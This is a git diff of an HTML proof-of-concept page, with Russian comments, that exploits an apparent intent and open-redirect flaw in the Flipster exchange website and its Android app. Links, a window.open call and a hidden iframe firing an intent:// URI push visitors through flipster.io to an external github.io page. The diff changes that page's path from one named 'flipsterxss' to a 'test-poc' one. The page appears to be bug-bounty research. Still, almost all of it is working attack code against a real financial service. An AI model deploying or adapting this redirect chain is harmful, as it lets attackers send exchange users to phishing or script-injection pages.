@@ -6,30 +6,36 @@
 </head>
 <body>
     <h2>Flipster Intent Redirection PoC</h2>
+
     <!-- Простая https ссылка — для всех браузеров -->
-    <p><a href="https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/">
+    <p><a href="https://flipster.io/https://xaleraf4ra.github.io/test-poc.github.io/">
         1. Direct HTTPS link
     </a></p>
+
     <!-- JS redirect через кнопку -->
     <p><button onclick="tryIntent()">2. Open via Intent</button></p>
+
     <!-- Автоматический редирект -->
     <p><button onclick="autoOpen()">3. Auto-redirect</button></p>
+
     <script>
     function tryIntent() {
-        var w = window.open("https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/", "_blank");
+        var w = window.open("https://flipster.io/https://xaleraf4ra.github.io/test-poc.github.io/", "_blank");
         if (!w) {
-            window.location.href = "https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/";
+            window.location.href = "https://flipster.io/https://xaleraf4ra.github.io/test-poc.github.io/";
         }
     }
+
     function autoOpen() {
         // Пробуем intent scheme
         var iframe = document.createElement("iframe");
         iframe.style.display = "none";
-        iframe.src = "intent://flipster.io/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;package=com.prestolabs.android.prex;end";
+        iframe.src = "intent://flipster.io/https://xaleraf4ra.github.io/test-poc.github.io/#Intent;scheme=https;package=com.prestolabs.android.prex;end";
         document.body.appendChild(iframe);
+
         // Фоллбэк через 2 секунды — прямой URL
         setTimeout(function() {
-            window.location.href = "https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/";
+            window.location.href = "https://flipster.io/https://xaleraf4ra.github.io/test-poc.github.io/";
         }, 2000);
     }
     </script>
